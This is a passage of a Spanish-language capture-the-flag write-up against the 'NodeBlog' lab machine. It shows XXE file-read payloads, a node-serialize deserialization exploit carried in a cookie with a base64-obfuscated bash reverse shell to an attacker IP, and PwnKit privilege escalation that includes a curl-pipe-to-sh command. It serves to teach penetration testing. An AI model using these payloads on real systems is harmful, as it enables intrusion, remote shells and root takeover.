+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Invalid</span> <span class="no">XML</span> <span class="no">Example</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">post</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Example</span> <span class="no">Post</span><span class="o">&lt;</span><span class="sr">/title&gt;&lt;description&gt;Example Description&lt;/</span><span class="n">description</span><span class="o">&gt;&lt;</span><span class="n">markdown</span><span class="o">&gt;</span><span class="no">Example</span> <span class="no">Markdown</span><span class="o">&lt;</span><span class="sr">/markdown&gt;&lt;/</span><span class="n">post</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;post&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;</span>
+    <span class="nt">&lt;markdown&gt;</span>Example Markdown<span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>Asi que ahora subiremos un XML con esa estructura para probar, y vean que nos lo interpreta:</p>
+
+<p><img src="/assets/img/nodeBlog/7.png" alt="" /></p>
+
+<p>En este punto como sabemos que podemos subir archivos XML y este sera interpretado, intentaremos probar XXE pero no centraremos en leer archivos de la maquina de esta manera:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY archivo SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
+<span class="nt">&lt;post&gt;</span>
+    <span class="nt">&lt;title&gt;</span>ola<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;description&gt;</span>descripcion ejemplo<span class="nt">&lt;/description&gt;</span>
+    <span class="nt">&lt;markdown&gt;</span><span class="ni">&amp;archivo;</span><span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Con <strong>&lt;!DOCTYPE foo [ &lt;!ENTITY archivo SYSTEM “file:///etc/passwd”&gt; ]&gt;</strong> se le esta indicando que defina una entidad externa con el nombre <strong>archivo</strong> la cual hace uso del wrapper <strong>file://</strong> para apuntar al archivo <strong>/etc/passwd</strong>, si probamos vamos a poder ver el archivo passwd, lo que estaria pasando es que la entidad externa se estaria procesando, y gracias al wapper file, se estaria incluyendo el archivo <strong>passwd</strong> en la respuesta del servidor</li>
+</ul>
+
+<p><img src="/assets/img/nodeBlog/8.png" alt="" /></p>
+
+<h3 id="xxe-leyendo-el-archivo-de-la-aplicacion">XXE (leyendo el archivo de la aplicacion)</h3>
+
+<p>Recordemos que anteriormente les habia mostrado que en el panel de login cuando se le manda una entrada incorrecta, la aplicacion peta y filtra la ruta de la aplicacion, la cual es <strong>/opt/blog/</strong>, nuestro objetivo es encontrar el archivo main de la aplicacion, tambien recuerden que en la enumeracion nos dimos cuenta que aplicacion hace uso de <strong>NodeJS</strong>, pues en una aplicacion de <strong>NodeJS</strong> los nombres del archivo main mas comunes son: <strong>server.js</strong>, <strong>app.js</strong>, <strong>index.js</strong> o <strong>main.js</strong>, asi que usaremos el XXE para apuntar a ese archivo, les puedo adelantar que el correcto en este caso es el <strong>server.js</strong>, y nuestro payload quedaria asi:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY archivo SYSTEM "file:///opt/blog/server.js"&gt;</span> ]&gt;
+<span class="nt">&lt;post&gt;</span>
+    <span class="nt">&lt;title&gt;</span>ola<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;description&gt;</span>descripcion ejemplo<span class="nt">&lt;/description&gt;</span>
+    <span class="nt">&lt;markdown&gt;</span><span class="ni">&amp;archivo;</span><span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>El ejecutarlo obtendremos el contenido de ese archivo</p>
+
+<p><img src="/assets/img/nodeBlog/9.png" alt="" /></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">Article</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./models/article</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">articleRouter</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/articles</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">loginRouter</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/login</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">methodOverride</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">method-override</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">fileUpload</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express-fileupload</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-parser</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">cookie_secret</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">UHC-SecretCookie</span><span class="dl">"</span>
+<span class="c1">//var session = require('express-session');</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+
+<span class="nx">mongoose</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongodb://localhost/blog</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">methodOverride</span><span class="p">(</span><span class="dl">'</span><span class="s1">_method</span><span class="dl">'</span><span class="p">))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">fileUpload</span><span class="p">())</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+<span class="c1">//app.use(session({secret: "UHC-SecretKey-123"}));</span>
+
+<span class="kd">function</span> <span class="nx">authenticated</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">c</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">false</span>
+
+    <span class="nx">c</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">sign</span> <span class="o">==</span> <span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">cookie_secret</span> <span class="o">+</span> <span class="nx">c</span><span class="p">.</span><span class="nx">user</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">))</span> <span class="p">){</span>
+        <span class="k">return</span> <span class="kc">true</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">articles</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Article</span><span class="p">.</span><span class="nx">find</span><span class="p">().</span><span class="nx">sort</span><span class="p">({</span>
+        <span class="na">createdAt</span><span class="p">:</span> <span class="dl">'</span><span class="s1">desc</span><span class="dl">'</span>
+    <span class="p">})</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">articles/index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">articles</span><span class="p">:</span> <span class="nx">articles</span><span class="p">,</span> <span class="na">ip</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">remoteAddress</span><span class="p">,</span> <span class="na">authenticated</span><span class="p">:</span> <span class="nx">authenticated</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">auth</span><span class="p">)</span> <span class="p">})</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/articles</span><span class="dl">'</span><span class="p">,</span> <span class="nx">articleRouter</span><span class="p">)</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="nx">loginRouter</span><span class="p">)</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="insecure-deserialization">Insecure Deserialization</h2>
+
+<p>Observa que en los imports se importa <strong>node-serialize</strong></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>node-serialize</strong> es un modulo de NodeJS para deserializar y serializar objetos JSON, este modulo es controversial por que es vulnerable a RCE mediante una <strong>Insecure Deserialization</strong> en el metodo <strong>unserialize</strong> si se usa una expresion <strong>IIFE</strong>.</p>
+
+<h3 id="analisis-del-codigo">Analisis del codigo</h3>
+
+<p>La parte interesante es la funcion <strong>authenticated</strong></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">authenticated</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">c</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">false</span>
+
+    <span class="nx">c</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">sign</span> <span class="o">==</span> <span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">cookie_secret</span> <span class="o">+</span> <span class="nx">c</span><span class="p">.</span><span class="nx">user</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">))</span> <span class="p">){</span>
+        <span class="k">return</span> <span class="kc">true</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>La funcion recibe un unico parametro que es <strong>c</strong>, que en esta caso es una objeto en JSON serializado</p>
+
+<ul>
+  <li>
+    <p>El primer if verifica si el objerto serializado (c) que corresponde a la cookie, es <strong>undefined</strong>, osea que si no se proporciona, entonces regresa <strong>false</strong>, esto es simplemente para comprobar si el usuario no esta autenticado</p>
+  </li>
+  <li>
+    <p>Con <strong>c = serialize.unserialize(c)</strong> se este deserializando el objeto <strong>c</strong>, observa que <strong>unserialize</strong> se utiliza sobre la cookie (c), esa cookie es la misma que usamos anteriormente, esa cookie esta en formato JSON y en URL encode, si la decodificamos, obtenemos algo como esto:</p>
+  </li>
+</ul>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"sign"</span><span class="p">:</span><span class="s2">"23e112072945418601deb47d9a6c7de8"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Con el ultimo if se verifica si la firma de la cookie es correcta, esta comprobacion la hace calculando el hash <strong>MD5</strong> del resultado de concatenar <strong>cookie_secret</strong> y <strong>c.user</strong></li>
+</ul>
+
+<p>Como sabemos que el metodo <strong>unserialize</strong> es vulnerable a <strong>Insecure Deserialization</strong> y ademas de que la cookie se le pasa a <strong>unserialize</strong>, entonces debemos de agregar nuestro payload a la cookie, la explotacion la hare guiandome de <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">aqui</a> y de <a href="https://security.snyk.io/vuln/npm:node-serialize:20170208">aqui</a>, basicamente nos dice que podemos conseguir RCE si le pasamos un objeto serializado malicioso usando IIFE para invocar inmediatemente la funcion.</p>
+
+<h3 id="iife">IIFE</h3>
+
+<p>Antes de explotar, veremos como funciona IIFE, IIFE significa <strong>Immediately Invoked Function Expression</strong>, y son funciones que se ejecutan tan pronto como se definen, ej</p>
+
+<p>Tenemos una funcion como esta:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">hola</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">hola</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Que no se va a ejecutar hasta que nosotros la mandemos llamar de una forma parecida a esta: <strong>hola();</strong>, pero que pasara si ahora nosotros la convertimos en esto:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">hola</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">})();</span>
+</code></pre></div></div>
+<p>Observa como se agregaron parentesis de mas, y al final se le agrego un <strong>();</strong>, eso se hizo para indicarle que la funcion sea llamada, es decir que permita una ejecucion inmediata apenas sea definida la funcion, basicamante el <strong>();</strong> en el que nos permite ejecutar la funcion apenas sea definida, si quieres saber mas haz click <a href="https://developer.mozilla.org/en-US/docs/Glossary/IIFE">aqui</a></p>
+
+<h2 id="deserializacion-attack-iife">Deserializacion Attack (IIFE)</h2>
+
+<p>Regresando a la explotacion, primero para probar la vulnerabilidad debemos de generar objeto serializado usando <code class="language-plaintext highlighter-rouge">node-serialize</code>, asi que instalaremos ese modulo</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">npm</span> <span class="n">install</span> <span class="n">node</span><span class="o">-</span><span class="n">serialize</span>
+</code></pre></div></div>
+
+<p>Despues creamos un archivo de js y usaremos este PoC:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">{"rce":"_$$ND_FUNC$$_function (){require(</span><span class="se">\'</span><span class="s1">child_process</span><span class="se">\'</span><span class="s1">).exec(</span><span class="se">\'</span><span class="s1">whoami </span><span class="se">\'</span><span class="s1">, function(error, stdout, stderr) { console.log(stdout) });}()"}</span><span class="dl">'</span><span class="p">;</span> 
+<span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Observa que la variable payload es la que tiene todo nuestro payload, unico que esta haciendo es definir una funcion que usara <strong>exec</strong> para ejecutar un comando, en este caso es <strong>whoami</strong>, la parte de IIFE entra al final del payload, observa como al final se le agrega un <strong>()</strong>, que como mencione anteriormente, esta permitiendo que la funcion se ejecutara inmediatemente apenas sea definida, el resultado de ejecutar esto, es el resultado de ejecutar el comando <strong>whoami</strong></p>
+
+<p><img src="/assets/img/nodeBlog/10.png" alt="" /></p>
+
+<p>Asi que ahora debemos de hacer lo mismo pero en la maquina victima, ¿Y como?, usaremos un payload similar a este:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"rce"</span><span class="p">:</span><span class="s2">"_$$ND_FUNC$$_function (){require(</span><span class="se">\'</span><span class="s2">child_process</span><span class="se">\'</span><span class="s2">).exec(</span><span class="se">\'</span><span class="s2">whoami </span><span class="se">\'</span><span class="s2">, function(error, stdout, stderr) { console.log(stdout) });}()"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Pero en lugar de ejecutar el whoami, ejecutaremos una reverse shell, y ese payload lo URL encodearemos y lo pasaremos como cookie, si preguntas que por que a la cookie, es por que cuando analizamos el codigo de la aplicacion, la cookie se le pasa al metodo <strong>unserialize</strong>, entonces cuando la aplicacion deserialize la cookie, se estaria deserializando nuestro payload que esta haciendo uso de <strong>IIFE</strong> para ejecutar la funcion y darnos una reverse shell.</p>
+
+<p>Nuestro payload quedaria asi:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"rce"</span><span class="p">:</span><span class="s2">"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDMgMD4mMQo=|base64 -d|bash',function(error,stdout,stderr){console.log(stdout)});}()"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Date cuenta que la reverse shell esta en base64 y simplemente se decodifica, fue generada de esta forma:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/443 0&gt;&amp;1'</span> <span class="o">|</span> <span class="n">base64</span>
+</code></pre></div></div>
+
+<p>Esto si lo URL encodeamos queda algo como esto:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="mi">7</span><span class="no">B</span><span class="o">%</span><span class="mi">22</span><span class="n">rce</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="no">A</span><span class="o">%</span><span class="mi">22</span><span class="n">_</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24</span><span class="no">ND_FUNC</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24</span><span class="n">_function</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">7</span><span class="no">Brequire</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">27</span><span class="n">child_process</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">29</span><span class="p">.</span><span class="nf">exec</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">27</span><span class="n">echo</span><span class="o">%</span><span class="mi">20</span><span class="no">YmFzaCAtaSA</span><span class="o">%</span><span class="mi">2</span><span class="no">BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDMgMD4mMQo</span><span class="o">%</span><span class="mi">3</span><span class="no">D</span><span class="o">%</span><span class="mi">7</span><span class="no">Cbase64</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">d</span><span class="o">%</span><span class="mi">7</span><span class="no">Cbash</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">2</span><span class="no">Cfunction</span><span class="o">%</span><span class="mi">28</span><span class="n">error</span><span class="o">%</span><span class="mi">2</span><span class="no">Cstdout</span><span class="o">%</span><span class="mi">2</span><span class="no">Cstderr</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">7</span><span class="no">Bconsole</span><span class="p">.</span><span class="nf">log</span><span class="o">%</span><span class="mi">28</span><span class="n">stdout</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">7</span><span class="no">D</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="no">B</span><span class="o">%</span><span class="mi">7</span><span class="no">D</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="no">D</span>
+</code></pre></div></div>
+
+<p>Y esa seria el valor de la cookie que ingresaremos, de esta forma:</p>
+
+<p><img src="/assets/img/nodeBlog/11.png" alt="" /></p>
+
+<p>Solo recargamos y si estamos en escucha tendremos una shell</p>
+
+<h2 id="flag-de-user">Flag de user</h2>
+
+<p>Si vemos que podemos ejecutar a nivel de sudoers, nos pedira una contraseña que no sabemos cual es:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="ss">admin: 
+</span></code></pre></div></div>
+
+<p>Si intentamos ingresar al directorio <strong>admin</strong>, nos dira que no tenemos permisos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">cd</span> <span class="n">admin</span><span class="o">/</span>
+<span class="ss">bash: cd: </span><span class="n">admin</span><span class="o">/</span><span class="p">:</span> <span class="no">Permission</span> <span class="n">denied</span>
+</code></pre></div></div>
+
+<p>Sin embargo, vemos que nosotros somo el propietario de ese directorio:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">drw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">admin</span> <span class="n">admin</span> <span class="mi">220</span> <span class="no">Jan</span>  <span class="mi">3</span>  <span class="mi">2022</span> <span class="n">admin</span>
+</code></pre></div></div>
+
+<p>Asi que simplemente podemos darle permisos con chmod y ya esta la flag:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">admin</span><span class="o">/</span>
+<span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">home</span><span class="err">$</span> <span class="n">cat</span> <span class="n">admin</span><span class="o">/</span><span class="n">user</span><span class="p">.</span><span class="nf">txt</span> 
+<span class="n">e7713113cad6e97e6f762a60e80cba37</span>
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<h3 id="via-pwnkit">Via pwnkit</h3>
+
+<p>Si buscamos por binarios SUID con el comando</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
+</code></pre></div></div>
+
+<p>Podemos ver que existe el de pkexec: <strong>/usr/bin/pkexec</strong>, asi que existe una via potencial para escalar privilegios con <strong>pwnkit</strong>, para explotarla nos guiaremos de este exploit: <a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a></p>
+
+<p>Ahi nos dicen que podemos ejecutarlo simplemente con un comando:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"</span>
+</code></pre></div></div>
+
+<p>Sin embargo en la maquina no funcionara, asi que descargare el exploit en mi maquina y luego creare un servidor web con python para pasarlo a la maquina victima, simplemente en la maquina victima hacemos un <strong>wget</strong> le damos permisos y ejecutamos y ya somos root:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="no">PwnKit</span> 
+<span class="n">admin</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="p">.</span><span class="nf">/</span><span class="no">PwnKit</span> 
+<span class="n">root</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">tmp</span><span class="c1"># whoami </span>
+<span class="n">root</span>
+<span class="n">root</span><span class="vi">@nodeblog</span><span class="ss">:/</span><span class="n">tmp</span><span class="c1"># </span>
+</code></pre></div></div>
+<p>Sin embargo, esta forma de escalar privilegios esta guarra, asi que lo haremos por la intencionada</p>
+
+<h3 id="via-mongodb-enumeration">Via mongodb enumeration</h3>
+
+<p>Al principio del writeup les habia mencionado que el sitio web es muy probable que use <strong>MEAN stack</strong>, eso significa que usa:</p>
+
+<ul>
+  <li><strong>M</strong>: MongoDB</li>
+  <li><strong>E</strong>: ExpressJS</li>
+  <li><strong>A</strong>: AngularJS</li>
+  <li><strong>N</strong>: NodeJS</li>
+</ul>
+
+<p>Y la neta tiene toda la pinta de que lo use, si mostramos por puertos abiertos y conexiones establecidas con el comando:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netstat</span> <span class="o">-</span><span class="n">a</span>
+</code></pre></div></div>
+
+<p>Podemos ver que existe el puerto <strong>27017</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="n">nodeblog</span><span class="p">:</span><span class="mi">27017</span>          <span class="n">nodeblog</span><span class="p">:</span><span class="mi">38938</span>          <span class="no">ESTABLISHED</span>
+</code></pre></div></div>
+
+<p>Si buscamos en google el puerto por defecto de MongoDB, nos saldra que es ese, y tambien en las conexiones establecidas, podremos ver una conexion con un archivo de MongoDB</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">unix</span>  <span class="mi">2</span>      <span class="p">[</span> <span class="no">ACC</span> <span class="p">]</span>     <span class="no">STREAM</span>     <span class="no">LISTENING</span>     <span class="mi">20468</span>    <span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">mongodb</span><span class="o">/</span><span class="n">mongodb</span><span class="o">-</span><span class="mi">27017</span><span class="p">.</span><span class="nf">sock</span>
+</code></pre></div></div>
+
